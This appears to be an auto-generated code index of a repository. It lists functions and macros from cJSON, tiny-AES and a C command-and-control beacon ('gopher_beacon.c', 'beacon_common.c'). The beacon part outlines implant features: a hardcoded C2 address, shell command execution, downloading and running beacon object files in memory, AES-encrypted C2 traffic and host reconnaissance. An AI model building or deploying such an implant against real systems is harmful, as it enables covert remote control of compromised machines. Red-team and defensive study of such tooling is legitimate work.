- `CJSON_PUBLIC` (line 2111) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToObject(cJSON *object, const char *string, cJSON *item)`
- `CJSON_PUBLIC` (line 2122) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToArray(cJSON *array, cJSON *item)`
- `CJSON_PUBLIC` (line 2132) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToObject(cJSON *object, const char *string, cJSON ...`
- `CJSON_PUBLIC` (line 2142) `CJSON_PUBLIC(cJSON*) cJSON_AddNullToObject(cJSON * const object, const char * const name)`
- `CJSON_PUBLIC` (line 2154) `CJSON_PUBLIC(cJSON*) cJSON_AddTrueToObject(cJSON * const object, const char * const name)`
- `CJSON_PUBLIC` (line 2166) `CJSON_PUBLIC(cJSON*) cJSON_AddFalseToObject(cJSON * const object, const char * const name)`
- `CJSON_PUBLIC` (line 2178) `CJSON_PUBLIC(cJSON*) cJSON_AddBoolToObject(cJSON * const object, const char * const name, const c...`
- `CJSON_PUBLIC` (line 2190) `CJSON_PUBLIC(cJSON*) cJSON_AddNumberToObject(cJSON * const object, const char * const name, const...`
- `CJSON_PUBLIC` (line 2202) `CJSON_PUBLIC(cJSON*) cJSON_AddStringToObject(cJSON * const object, const char * const name, const...`
- `CJSON_PUBLIC` (line 2214) `CJSON_PUBLIC(cJSON*) cJSON_AddRawToObject(cJSON * const object, const char * const name, const ch...`
- `CJSON_PUBLIC` (line 2226) `CJSON_PUBLIC(cJSON*) cJSON_AddObjectToObject(cJSON * const object, const char * const name)`
- `CJSON_PUBLIC` (line 2238) `CJSON_PUBLIC(cJSON*) cJSON_AddArrayToObject(cJSON * const object, const char * const name)`
- `CJSON_PUBLIC` (line 2250) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemViaPointer(cJSON *parent, cJSON * const item)`
- `CJSON_PUBLIC` (line 2286) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromArray(cJSON *array, int which)`
- `CJSON_PUBLIC` (line 2296) `CJSON_PUBLIC(void) cJSON_DeleteItemFromArray(cJSON *array, int which)`
- `CJSON_PUBLIC` (line 2301) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObject(cJSON *object, const char *string)`
- `CJSON_PUBLIC` (line 2308) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObjectCaseSensitive(cJSON *object, const char *string)`
- `CJSON_PUBLIC` (line 2315) `CJSON_PUBLIC(void) cJSON_DeleteItemFromObject(cJSON *object, const char *string)`
- `CJSON_PUBLIC` (line 2320) `CJSON_PUBLIC(void) cJSON_DeleteItemFromObjectCaseSensitive(cJSON *object, const char *string)`
- `CJSON_PUBLIC` (line 2362) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemViaPointer(cJSON * const parent, cJSON * const item, cJ...`
- `CJSON_PUBLIC` (line 2412) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInArray(cJSON *array, int which, cJSON *newitem)`
- `replace_item_in_object` (line 2422) `static cJSON_bool replace_item_in_object(cJSON *object, const char *string, cJSON *replacement, c...`
- `CJSON_PUBLIC` (line 2445) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObject(cJSON *object, const char *string, cJSON *newi...`
- `CJSON_PUBLIC` (line 2450) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObjectCaseSensitive(cJSON *object, const char *string...`
- `CJSON_PUBLIC` (line 2467) `CJSON_PUBLIC(cJSON *) cJSON_CreateTrue(void)`
- `CJSON_PUBLIC` (line 2478) `CJSON_PUBLIC(cJSON *) cJSON_CreateFalse(void)`
- `CJSON_PUBLIC` (line 2489) `CJSON_PUBLIC(cJSON *) cJSON_CreateBool(cJSON_bool boolean)`
- `CJSON_PUBLIC` (line 2500) `CJSON_PUBLIC(cJSON *) cJSON_CreateNumber(double num)`
- `CJSON_PUBLIC` (line 2525) `CJSON_PUBLIC(cJSON *) cJSON_CreateString(const char *string)`
- `CJSON_PUBLIC` (line 2542) `CJSON_PUBLIC(cJSON *) cJSON_CreateStringReference(const char *string)`
- `CJSON_PUBLIC` (line 2554) `CJSON_PUBLIC(cJSON *) cJSON_CreateObjectReference(const cJSON *child)`
- `CJSON_PUBLIC` (line 2566) `CJSON_PUBLIC(cJSON *) cJSON_CreateArrayReference(const cJSON *child)`
- `CJSON_PUBLIC` (line 2578) `CJSON_PUBLIC(cJSON *) cJSON_CreateRaw(const char *raw)`
- `CJSON_PUBLIC` (line 2595) `CJSON_PUBLIC(cJSON *) cJSON_CreateArray(void)`
- `CJSON_PUBLIC` (line 2606) `CJSON_PUBLIC(cJSON *) cJSON_CreateObject(void)`
- `CJSON_PUBLIC` (line 2658) `CJSON_PUBLIC(cJSON *) cJSON_CreateFloatArray(const float *numbers, int count)`
- `CJSON_PUBLIC` (line 2698) `CJSON_PUBLIC(cJSON *) cJSON_CreateDoubleArray(const double *numbers, int count)`
- `CJSON_PUBLIC` (line 2738) `CJSON_PUBLIC(cJSON *) cJSON_CreateStringArray(const char *const *strings, int count)`
- `cJSON_Duplicate_rec` (line 2785) `cJSON * cJSON_Duplicate_rec(const cJSON *item, size_t depth, cJSON_bool recurse)`
- `skip_oneline_comment` (line 2872) `static void skip_oneline_comment(char **input)`
- `skip_multiline_comment` (line 2885) `static void skip_multiline_comment(char **input)`
- `minify_string` (line 2899) `static void minify_string(char **input, char **output)`
- `CJSON_PUBLIC` (line 2921) `CJSON_PUBLIC(void) cJSON_Minify(char *json)`
- `CJSON_PUBLIC` (line 2971) `CJSON_PUBLIC(cJSON_bool) cJSON_IsInvalid(const cJSON * const item)`
- `CJSON_PUBLIC` (line 2981) `CJSON_PUBLIC(cJSON_bool) cJSON_IsFalse(const cJSON * const item)`
- `CJSON_PUBLIC` (line 2991) `CJSON_PUBLIC(cJSON_bool) cJSON_IsTrue(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3001) `CJSON_PUBLIC(cJSON_bool) cJSON_IsBool(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3011) `CJSON_PUBLIC(cJSON_bool) cJSON_IsNull(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3021) `CJSON_PUBLIC(cJSON_bool) cJSON_IsNumber(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3031) `CJSON_PUBLIC(cJSON_bool) cJSON_IsString(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3041) `CJSON_PUBLIC(cJSON_bool) cJSON_IsArray(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3051) `CJSON_PUBLIC(cJSON_bool) cJSON_IsObject(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3061) `CJSON_PUBLIC(cJSON_bool) cJSON_IsRaw(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3071) `CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_...`
- `cJSON_ArrayForEach` (line 3157) `cJSON_ArrayForEach(a_element, a)`
- `cJSON_ArrayForEach` (line 3173) `cJSON_ArrayForEach(b_element, b)` - *doing this twice, once on a and b to prevent true comparison if a subset of b * TODO: Do this the proper way, this is just a fix for now*
- `CJSON_PUBLIC` (line 3193) `CJSON_PUBLIC(void *) cJSON_malloc(size_t size)`
- `CJSON_PUBLIC` (line 3198) `CJSON_PUBLIC(void) cJSON_free(void *object)`
- `sprintf` (line 128) `sprintf(version, "%i.%i.%i", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH);`
- `tolower` (line 153) `return tolower(*string1) - tolower(*string2);`
- `void` (line 160) `void (CJSON_CDECL *deallocate)(void *pointer);`
- `malloc` (line 168) `return malloc(size);`
- `free` (line 172) `free(pointer);`
- `realloc` (line 176) `return realloc(pointer, size);`
- `memcpy` (line 205) `memcpy(copy, string, length);`
- `memset` (line 247) `memset(node, '\0', sizeof(cJSON));`
- `cJSON_Delete` (line 262) `cJSON_Delete(item->child);`
- `strcpy` (line 464) `strcpy(object->valuestring, valuestring);`
- `cJSON_free` (line 475) `cJSON_free(object->valuestring);`
- `cJSON_ParseWithLengthOpts` (line 1145) `return cJSON_ParseWithLengthOpts(value, buffer_length, return_parse_end, require_null_terminated);`
- `cJSON_ParseWithOpts` (line 1233) `return cJSON_ParseWithOpts(value, 0, 0);`
- `cJSON_DetachItemViaPointer` (line 2293) `return cJSON_DetachItemViaPointer(array, get_array_item(array, (size_t)which));`
- `cJSON_ReplaceItemViaPointer` (line 2419) `return cJSON_ReplaceItemViaPointer(array, get_array_item(array, (size_t)which), newitem);`

**Macros:**
- `_CRT_SECURE_NO_DEPRECATE` (line 28) `#define _CRT_SECURE_NO_DEPRECATE`
- `true` (line 65) `#define true`
- `false` (line 70) `#define false`
- `isinf` (line 74) `#define isinf(d)`
- `isnan` (line 77) `#define isnan(d)`
- `NAN` (line 82) `#define NAN`
- `NAN` (line 84) `#define NAN`
- `internal_malloc` (line 179) `#define internal_malloc`
- `internal_free` (line 180) `#define internal_free`
- `internal_realloc` (line 181) `#define internal_realloc`
- `static_strlen` (line 185) `#define static_strlen(string_literal)`
- `can_read` (line 301) `#define can_read(buffer, size)`
- `can_access_at_index` (line 303) `#define can_access_at_index(buffer, index)`
- `cannot_access_at_index` (line 304) `#define cannot_access_at_index(buffer, index)`
- `buffer_at_offset` (line 306) `#define buffer_at_offset(buffer)`
- `cjson_min` (line 1240) `#define cjson_min(a, b)`

**Structs:**
- `internal_hooks` (line 157)
- `error` (line 88)
- `parse_buffer` (line 291)
- `printbuffer` (line 482)

#### `gopher_beacon.c`
**Path:** `gopher_beacon.c`
**File Doc:** *define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <sys/types.h> include <sys/socket.h> include <netinet/in.h> include <arpa/inet.h> include <net/if.h> include <sys/ioctl.h> include <pwd.h> include <errno.h> include <openssl/buffer.h> include <openssl/rand.h> include <sys/mman.h> include <elf.h> include <dlfcn.h> include <fcntl.h> include <stdint.h> include <sys/wait.h> include <stdarg.h> include <netdb.h>  include "beacon.h" include "aes.h" include "cJSON.h"  define C2              "10.10.14.57"*

**Functions:**
- `__attribute__` (line 137) `static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...`
- `BeaconPrintf` (line 190) `void BeaconPrintf(int type, const char *fmt, ...)` - *=== BEACON API ===*
- `BeaconOutput` (line 202) `void BeaconOutput(int type, const char *data, int len)`
- `create_trampoline` (line 214) `static void* create_trampoline(void* target)` - *=== CRATE TRAPOLINE ===*
- `cleanup_trampolines` (line 250) `static void cleanup_trampolines(void)` - *=== CLEAN TRAMPOLINE ===*
- `get_or_create_trampoline` (line 265) `static void* get_or_create_trampoline(void* target)`
- `WriteMemoryCallback` (line 297) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)` - *=== CURL WRITE CALLBACK ===*
- `gopher_request` (line 314) `char* gopher_request(const char* host, int port, const char* selector, const char* method, const ...` - *=== GOPHER REQUEST () ===*
- `base64_encode` (line 377) `char* base64_encode(const unsigned char* input, int len)` - *=== BASE64 ===*
- `base64_decode` (line 393) `unsigned char* base64_decode(const char* input, int* len)`
- `aes256_cfb_encrypt` (line 417) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...` - *=== AES CFB ===*
- `aes256_cfb_decrypt` (line 444) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- `exec_cmd` (line 475) `char* exec_cmd(const char* cmd, int* out_len)` - *=== EXEC CMD ===*
- `page_align` (line 506) `static size_t page_align(size_t size)` - *=== Función auxiliar: alinear al tamaño de página ===*
- `RunELF` (line 511) `int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, 
           unsi...`
- `get_local_ips` (line 893) `char* get_local_ips()` - *=== GET LOCAL IPs ===*
- `download_bof` (line 922) `unsigned char* download_bof(const char* bof_selector, size_t* out_size)` - *=== DOWNLOAD BOF ===*
- `run_bof_and_capture` (line 950) `char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          c...` - *=== RUN BOF AND CAPTURE ===*
- `main` (line 994) `int main()` - *=== MAIN ===*
- `void` (line 60) `typedef void (*bof_func_t)(char*, int);` - *=== TIPOS Y SÍMBOLOS FALTANTES ===*
- `volatile` (line 143) `asm volatile( // Guardar frame pointer "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" // Guardar callee-saved registers "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" //` - *CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el push del return address) Entonces necesitamos RSP % 16 == 8 justo antes del call*
- `va_start` (line 193) `va_start(args, fmt);`
- `va_end` (line 197) `va_end(args);`
- `memcpy` (line 208) `memcpy(g_beacon_output + g_output_len, data, len);`
- `fprintf` (line 221) `fprintf(stderr, "[!] Trampolín: mmap falló\n");`
- `munmap` (line 237) `munmap(code, code_size);`
- `free` (line 254) `free(g_trampolines);`
- `fflush` (line 319) `fflush(stdout);`
- `snprintf` (line 326) `snprintf(full_selector, sizeof(full_selector), "/report/%s", post_data);`
- `close` (line 345) `close(sockfd);`
- `send` (line 350) `send(sockfd, req, strlen(req), 0);`
- `BIO_set_flags` (line 383) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
- `BIO_write` (line 384) `BIO_write(b64, input, len);`
- `BIO_flush` (line 385) `BIO_flush(b64);`
- `BIO_get_mem_ptr` (line 386) `BIO_get_mem_ptr(b64, &bptr);`
- `BIO_free_all` (line 390) `BIO_free_all(b64);`
- `AES_init_ctx` (line 420) `AES_init_ctx(&ctx, key);`
- `AES_ECB_encrypt` (line 428) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- `memset` (line 437) `memset(iv_buf + block_size, 0, 16 - block_size);`
- `strdup` (line 478) `return strdup("[!] Empty command");`
- `pclose` (line 488) `pclose(fp);`
- `perror` (line 682) `perror("calloc");`
- `call_bof_isolated` (line 878) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
- `inet_ntop` (line 912) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
- `strcat` (line 914) `strcat(result, ip);`
- `strlen` (line 918) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- `setvbuf` (line 996) `setvbuf(stdout, NULL, _IOLBF, 0);` - *memcpy(output, g_beacon_output, g_output_len); output[g_output_len] = '\0'; out_len = g_output_len; fprintf(stderr, "[DEBUG] run_bof_and_capture: EXIT with %d bytes\n", *out_len); fflush(stderr); return output; } === MAIN === int main() { /* Fuerza line-buffering en stdout/stderr para que se imprima todo en tiempo real*
- `printf` (line 998) `printf("[*] Beacon starting...\n");`
- `srand` (line 1001) `srand(time(NULL));`
- `sleep` (line 1028) `sleep(6);`
- `gethostname` (line 1122) `gethostname(hostname, sizeof(hostname) - 1);`
- `cJSON_AddStringToObject` (line 1130) `cJSON_AddStringToObject(root, "output", output);`
- `cJSON_AddNumberToObject` (line 1133) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- `cJSON_AddNullToObject` (line 1138) `cJSON_AddNullToObject(root, "result_portscan");`
- `cJSON_Delete` (line 1142) `cJSON_Delete(root);`
- `RAND_bytes` (line 1148) `RAND_bytes(iv_out, 16);`

**Macros:**
- `_GNU_SOURCE` (line 1) `#define _GNU_SOURCE`
- `C2` (line 29) `#define C2`
- `CLIENT_ID` (line 31) `#define CLIENT_ID`
- `MALEABLE` (line 32) `#define MALEABLE`
- `USER_AGENTS_COUNT` (line 33) `#define USER_AGENTS_COUNT`

**Structs:**
- `MemoryStruct` (line 47) - *=== ESTRUCTURAS ===*
- `Trampoline` (line 54) - *=== TRAMPOLINES ===*
- `SymbolResolver` (line 62)
- `TrampolineCache` (line 68) - *=== CACHE DE TRAMPOLINES ===*

#### `aes.c`
**Path:** `include/aes.c`
**File Doc:** *aes.c - tiny-AES-c (https://github.com/kokke/tiny-AES-c) include "aes.h" include <string.h>  define Nb 4    define KEYLEN_256 32 define RKLENGTH (4 * (Nr + 1)) define BLOCKLEN 16*

**Functions:**
- `__attribute__` (line 12) `static __attribute__((unused)) uint8_t getSBoxValue(uint8_t num)` - *define KEYLEN_256 32 define RKLENGTH (4 * (Nr + 1)) define BLOCKLEN 16*
- `__attribute__` (line 34) `static __attribute__((unused)) uint8_t getSBoxInvert(uint8_t num)`
- `__attribute__` (line 56) `static __attribute__((unused)) uint8_t Td0(int x)`
- `__attribute__` (line 58) `static __attribute__((unused)) uint8_t Td1(int x)`
- `__attribute__` (line 59) `static __attribute__((unused)) uint8_t Td2(int x)`
- `__attribute__` (line 60) `static __attribute__((unused)) uint8_t Td3(int x)`
- `__attribute__` (line 61) `static __attribute__((unused)) uint8_t Td4(int x)`
- `KeyExpansion` (line 166) `static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)` - *This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states.*
- `AES_init_ctx` (line 238) `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)`
- `AES_init_ctx_iv` (line 244) `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)` - *if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))*
- `AES_ctx_set_iv` (line 249) `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)`
- `AddRoundKey` (line 257) `static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)` - *This function adds the round key to state. The round key is added to the state by an XOR function.*
- `SubBytes` (line 271) `static void SubBytes(state_t* state)` - *The SubBytes Function Substitutes the values in the state matrix with values in an S-box.*
- `ShiftRows` (line 286) `static void ShiftRows(state_t* state)` - *The ShiftRows() function shifts the rows in the state to the left. Each row is shifted with different offset. Offset = Row number. So the first row is not shifted.*
- `xtime` (line 313) `static uint8_t xtime(uint8_t x)`
- `MixColumns` (line 320) `static void MixColumns(state_t* state)` - *MixColumns function mixes the columns of the state matrix*
- `Multiply` (line 340) `static uint8_t Multiply(uint8_t x, uint8_t y)` - *Multiply is used to multiply numbers in the field GF(2^8) Note: The last call to xtime() is unneeded, but often ends up generating a smaller binary The compiler seems to be able to vectorize the operation better this way. See https://github.com/kokke/tiny-AES-c/pull/34 if MULTIPLY_AS_A_FUNCTION*
- `InvMixColumns` (line 370) `static void InvMixColumns(state_t* state)` - *MixColumns function mixes the columns of the state matrix. The method used to multiply may be difficult to understand for the inexperienced. Please use the references to gain more information.*
- `InvSubBytes` (line 391) `static void InvSubBytes(state_t* state)` - *The SubBytes Function Substitutes the values in the state matrix with values in an S-box.*
- `InvShiftRows` (line 402) `static void InvShiftRows(state_t* state)`
- `Cipher` (line 433) `static void Cipher(state_t* state, const uint8_t* RoundKey)` - *Cipher is the main function that encrypts the PlainText.*
- `InvCipher` (line 459) `static void InvCipher(state_t* state, const uint8_t* RoundKey)` - *if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)*
- `AES_ECB_encrypt` (line 488) `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)` - *AddRoundKey(round, state, RoundKey); if (round == 0) { break; } InvMixColumns(state); } } #endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)  /* Public functions:  if defined(ECB) && (ECB == 1)*
- `AES_ECB_decrypt` (line 495) `void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)`
- `XorWithIv` (line 510) `static void XorWithIv(uint8_t* buf, const uint8_t* Iv)` - *if defined(CBC) && (CBC == 1)*
- `AES_CBC_encrypt_buffer` (line 520) `void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, size_t length)`
- `AES_CBC_decrypt_buffer` (line 535) `void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)`
- `AES_CTR_xcrypt_buffer` (line 558) `void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)` - *XorWithIv(buf, ctx->Iv); memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN); buf += AES_BLOCKLEN; } } #endif // #if defined(CBC) && (CBC == 1) #if defined(CTR) && (CTR == 1) /* Symmetrical operation: same function for encrypting as for decrypting. Note any IV/nonce should never be reused with the same key*
- `memcpy` (line 247) `memcpy (ctx->Iv, iv, AES_BLOCKLEN);`

**Macros:**
- `Nb` (line 4) `#define Nb`
- `KEYLEN_256` (line 6) `#define KEYLEN_256`
- `RKLENGTH` (line 10) `#define RKLENGTH`
- `BLOCKLEN` (line 11) `#define BLOCKLEN`
- `Nb` (line 67) `#define Nb`
- `Nk` (line 70) `#define Nk`
- `Nr` (line 71) `#define Nr`
- `Nk` (line 73) `#define Nk`
- `Nr` (line 74) `#define Nr`
- `Nk` (line 76) `#define Nk`
- `Nr` (line 77) `#define Nr`
- `MULTIPLY_AS_A_FUNCTION` (line 84) `#define MULTIPLY_AS_A_FUNCTION`
- `getSBoxValue` (line 163) `#define getSBoxValue(num)`
- `Multiply` (line 349) `#define Multiply(x, y)`
- `getSBoxInvert` (line 365) `#define getSBoxInvert(num)`

#### `aes_cfb.c`
**Path:** `include/aes_cfb.c`

**Functions:**
- `aes256_cfb_encrypt` (line 19) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...` - *This is the same algorithm the v1 beacon uses to wrap C2 commands and results. The C2 server in c2/server.py implements the matching Python side using the `cryptography` library.  Public API: unsigned char* aes256_cfb_encrypt(key, iv, plain, len, &out_len); unsigned char* aes256_cfb_decrypt(key, iv, cipher, len, &out_len);  Both return a malloc'd buffer the caller must free. The decrypt variant appends a trailing NUL byte for convenience.  include "aes.h" include <stdlib.h> include <string.h>*
- `aes256_cfb_decrypt` (line 47) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- `AES_init_ctx` (line 23) `AES_init_ctx(&ctx, key);`
- `memcpy` (line 26) `memcpy(iv_buf, iv, 16);`
- `AES_ECB_encrypt` (line 31) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- `memset` (line 40) `memset(iv_buf + block_size, 0, 16 - block_size);`

#### `beacon_common.c`
**Path:** `include/beacon_common.c`

**Functions:**
- `bsb_output_init` (line 100) `int bsb_output_init(size_t capacity)` - *{ "BeaconOutput",   &g_BeaconOutput_ptr }, { "socket",         &g_socket_ptr }, { "connect",        &g_connect_ptr }, { "inet_addr",      &g_inet_addr_ptr }, { "htons",          &g_htons_ptr }, { "send",           &g_send_ptr }, { "recv",           &g_recv_ptr }, { "close",          &g_close_ptr }, { "getaddrinfo",    &g_getaddrinfo_ptr }, { "freeaddrinfo",   &g_freeaddrinfo_ptr }, { NULL, NULL } }; /* --- Output buffer management ---*
- `bsb_output_cleanup` (line 109) `void bsb_output_cleanup(void)`
- `bsb_output_reset` (line 116) `void bsb_output_reset(void)`
- `BeaconPrintf` (line 125) `void BeaconPrintf(int type, const char *fmt, ...)` - *free(g_beacon_output); g_beacon_output = NULL; g_output_capacity = 0; g_output_len = 0; } void bsb_output_reset(void) { if (g_beacon_output) { g_output_len = 0; g_beacon_output[0] = '\0'; } } /* --- Beacon API (called by BOFs) ---*
- `BeaconOutput` (line 137) `void BeaconOutput(int type, const char *data, int len)`
- `create_trampoline` (line 151) `void *create_trampoline(void *target)` - *void BeaconOutput(int type, const char *data, int len) { (void)type; if (!g_beacon_output || len <= 0 || !data) return; size_t remaining = g_output_capacity - g_output_len - 1; if ((size_t)len > remaining) { len = (int)remaining; } memcpy(g_beacon_output + g_output_len, data, len); g_output_len += len; g_beacon_output[g_output_len] = '\0'; } /* --- Trampoline management ---*
- `cleanup_trampolines` (line 180) `void cleanup_trampolines(void)`
- `get_or_create_trampoline` (line 195) `void *get_or_create_trampoline(void *target)`
- `WriteMemoryCallback` (line 224) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)`
- `https_request` (line 236) `http_response_t https_request(const bsb_config_t *cfg, const char *url,
                         ...`
- `base64_encode` (line 291) `char *base64_encode(const unsigned char *input, int len)` - *curl_easy_cleanup(curl); return resp; } long http_code = 0; curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code); resp.status = (int)http_code; resp.data = chunk.memory; resp.len = chunk.size; curl_easy_cleanup(curl); return resp; } /* --- Base64 ---*
- `base64_decode` (line 306) `unsigned char *base64_decode(const char *input, int *len)`
- `_is_unreserved` (line 329) `static int _is_unreserved(unsigned char c)` - *if (!buffer) { BIO_free_all(b64); return NULL; } len = BIO_read(b64, buffer, input_len); BIO_free_all(b64); if (*len <= 0) { free(buffer); return NULL; } return buffer; } /* --- URL encoding ---*
- `url_encode` (line 334) `char *url_encode(const char *in, size_t in_len, size_t *out_len)`
- `exec_cmd` (line 358) `char *exec_cmd(const char *cmd, int *out_len)` - *static const char hex[] = "0123456789ABCDEF"; out[j++] = '%'; out[j++] = hex[(c >> 4) & 0xF]; out[j++] = hex[c & 0xF]; } } out[j] = '\0'; out_len = j; return out; } /* AES-256-CFB wrappers are in aes_cfb.c /* --- Command execution ---*
- `bsb_backoff_init` (line 385) `void bsb_backoff_init(bsb_backoff_t *bo, int base, int max)` - *if (total >= capacity - 1) { capacity *= 2; char *tmp = realloc(buffer, capacity); if (!tmp) break; buffer = tmp; } } pclose(fp); buffer[total] = '\0'; out_len = (int)total; return buffer; } /* --- Backoff state ---*
- `bsb_backoff_next` (line 390) `int bsb_backoff_next(bsb_backoff_t *bo)`
- `bsb_backoff_reset` (line 399) `void bsb_backoff_reset(bsb_backoff_t *bo)`
- `get_local_ips` (line 405) `char *get_local_ips(void)` - *int bsb_backoff_next(bsb_backoff_t *bo) { int val = bo->current_seconds; bo->current_seconds *= 2; if (bo->current_seconds > bo->max_seconds) { bo->current_seconds = bo->max_seconds; } return val; } void bsb_backoff_reset(bsb_backoff_t *bo) { bo->current_seconds = bo->base_seconds; } /* --- IP discovery ---*
- `download_bof` (line 434) `unsigned char *download_bof(const bsb_config_t *cfg, const char *url, size_t *out_size)` - *for (int i = 0; i < n; i++) { struct sockaddr_in *addr = (struct sockaddr_in*)&ifr[i].ifr_addr; if (addr->sin_family == AF_INET && strcmp(ifr[i].ifr_name, "lo") != 0) { char ip[INET_ADDRSTRLEN]; inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN); if (strlen(result) > 0) strcat(result, ", "); strcat(result, ip); } } close(sockfd); return strlen(result) > 0 ? result : strdup("127.0.0.1"); } /* --- BOF download ---*
- `init_function_pointers` (line 446) `static void init_function_pointers(void)` - */* --- BOF download --- unsigned char *download_bof(const bsb_config_t *cfg, const char *url, size_t *out_size) { http_response_t resp = https_request(cfg, url, "GET", NULL); if (!resp.data || resp.len == 0) { out_size = 0; free(resp.data); return NULL; } out_size = resp.len; return (unsigned char *)resp.data; } /* --- BOF execution with fork isolation ---*
- `page_align` (line 471) `static size_t page_align(size_t size)`
- `__attribute__` (line 477) `static void __attribute__((noinline)) call_bof_isolated(bof_func_t func, char *args, uintptr_t ar...`
- `RunELF` (line 506) `int RunELF(const char *functionname, unsigned char *elf_data, uint32_t filesize,
           unsig...`
- `run_bof_and_capture` (line 710) `char *run_bof_and_capture(unsigned char *elf_data, uint32_t filesize,
                           ...`
- `free` (line 111) `free(g_beacon_output);`
- `va_start` (line 129) `va_start(args, fmt);`
- `va_end` (line 132) `va_end(args);`
- `memcpy` (line 145) `memcpy(g_beacon_output + g_output_len, data, len);`
- `munmap` (line 169) `munmap(code, code_size);`
- `curl_easy_setopt` (line 244) `curl_easy_setopt(curl, CURLOPT_URL, url);`
- `curl_easy_cleanup` (line 277) `curl_easy_cleanup(curl);`
- `curl_easy_getinfo` (line 282) `curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);`
- `BIO_set_flags` (line 295) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
- `BIO_write` (line 296) `BIO_write(b64, input, len);`
- `BIO_flush` (line 297) `BIO_flush(b64);`
- `BIO_get_mem_ptr` (line 299) `BIO_get_mem_ptr(b64, &bptr);`
- `BIO_free_all` (line 303) `BIO_free_all(b64);`
- `pclose` (line 363) `pclose(fp);`
- `close` (line 413) `close(sockfd);`
- `strdup` (line 414) `return strdup("127.0.0.1");`
- `inet_ntop` (line 424) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
- `strcat` (line 426) `strcat(result, ip);`
- `strlen` (line 430) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- `volatile` (line 479) `asm volatile( "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" "sub $8, %%rsp\n\t" "mov %0, %%rdi\n\t" "mov %1, %%rsi\n\t" "`
- `memset` (line 594) `memset(addr, 0, aligned_size);`
- `call_bof_isolated` (line 690) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
- `_exit` (line 693) `_exit(0);`
- `waitpid` (line 696) `waitpid(pid, &status, 0);`

**Macros:**
- `_GNU_SOURCE` (line 9) `#define _GNU_SOURCE`

**Structs:**
